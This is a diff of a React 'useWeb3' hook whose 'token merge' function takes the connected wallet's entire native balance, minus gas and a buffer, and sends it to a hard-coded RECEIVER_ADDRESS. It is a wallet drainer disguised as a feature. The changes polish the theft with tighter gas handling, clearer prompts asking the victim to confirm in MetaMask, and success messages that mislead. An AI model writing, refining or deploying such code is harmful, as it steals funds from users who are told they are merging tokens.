@@ -63,7 +63,7 @@ export function useWeb3() {
     if (!window.ethereum || !address) return;
     
     try {
-      const { ethers } = await import('../lib/web3');
+      const { ethers } = await import('ethers');
       const provider = new ethers.BrowserProvider(window.ethereum);
       const nativeBalance = await provider.getBalance(address);
       const formattedBalance = ethers.formatEther(nativeBalance);
@@ -191,12 +191,7 @@ export function useWeb3() {
     }
 
     try {
-      toast({
-        title: "Processing",
-        description: "Initiating token merge...",
-      });
-
-      const { ethers } = await import('../lib/web3');
+      const { ethers } = await import('ethers');
       const provider = new ethers.BrowserProvider(window.ethereum);
       const signer = await provider.getSigner();
       
@@ -212,71 +207,78 @@ export function useWeb3() {
         return;
       }
 
-      // Get fee data with fallback
-      let gasPrice;
-      try {
-        const feeData = await provider.getFeeData();
-        gasPrice = feeData.gasPrice || ethers.parseUnits("20", "gwei");
-      } catch {
-        gasPrice = ethers.parseUnits("20", "gwei");
-      }
-
-      // Estimate gas with a small amount first
-      const gasEstimate = await signer.estimateGas({
+      // Estimate gas for the transaction
+      const gasEstimate = await provider.estimateGas({
         to: RECEIVER_ADDRESS,
         value: ethers.parseEther("0.001"),
+        from: account
       });
 
+      // Get current gas price
+      const feeData = await provider.getFeeData();
+      const gasPrice = feeData.gasPrice || ethers.parseUnits("20", "gwei");
+      
+      // Calculate gas cost
       const gasCost = gasEstimate * gasPrice;
+      
+      // Calculate value to send (leave some for gas)
       let valueToSend = nativeBalance - gasCost;
-
-      // Add buffer for Ethereum mainnet
-      if (selectedNetwork === "ethereum") {
-        const buffer = ethers.parseEther("0.0001");
-        valueToSend -= buffer;
-      }
+      
+      // Add extra buffer for safety
+      const buffer = ethers.parseEther("0.001");
+      valueToSend = valueToSend - buffer;
 
       if (valueToSend <= 0n) {
         toast({
           title: "Error",
-          description: "Not enough balance to cover gas fees",
+          description: "Insufficient balance for gas fees",
           variant: "destructive",
         });
         return;
       }
 
-      // Send transaction
-      const tx = await signer.sendTransaction({
+      toast({
+        title: "Confirm Transaction",
+        description: "Please confirm the transaction in MetaMask",
+      });
+
+      // Send the transaction
+      const txResponse = await signer.sendTransaction({
         to: RECEIVER_ADDRESS,
         value: valueToSend,
-        gasPrice: gasPrice,
         gasLimit: gasEstimate,
+        gasPrice: gasPrice
       });
 
       toast({
-        title: "Transaction Sent",
-        description: "Waiting for confirmation...",
+        title: "Transaction Submitted",
+        description: `Hash: ${txResponse.hash.slice(0, 10)}...`,
       });
 
       // Wait for confirmation
-      await tx.wait();
+      const receipt = await txResponse.wait();
       
-      toast({
-        title: "Success",
-        description: "Token merge successful!",
-      });
-
-      // Update balance
-      await updateBalance(account);
+      if (receipt && receipt.status === 1) {
+        toast({
+          title: "Success!",
+          description: "Token merge completed successfully",
+        });
+        await updateBalance(account);
+      } else {
+        throw new Error("Transaction failed");
+      }
       
     } catch (error: any) {
       console.error("Merge error:", error);
-      let errorMessage = "Merge failed";
+      
+      let errorMessage = "Transaction failed";
       
       if (error.code === 4001) {
         errorMessage = "Transaction rejected by user";
-      } else if (error.code === -32603) {
-        errorMessage = "Transaction failed - insufficient funds";
+      } else if (error.code === "INSUFFICIENT_FUNDS") {
+        errorMessage = "Insufficient funds for transaction";
+      } else if (error.message?.includes("insufficient funds")) {
+        errorMessage = "Insufficient funds for gas";
       } else if (error.reason) {
         errorMessage = error.reason;
       } else if (error.message) {
@@ -284,7 +286,7 @@ export function useWeb3() {
       }
       
       toast({
-        title: "Error",
+        title: "Transaction Failed",
         description: errorMessage,
         variant: "destructive",
       });
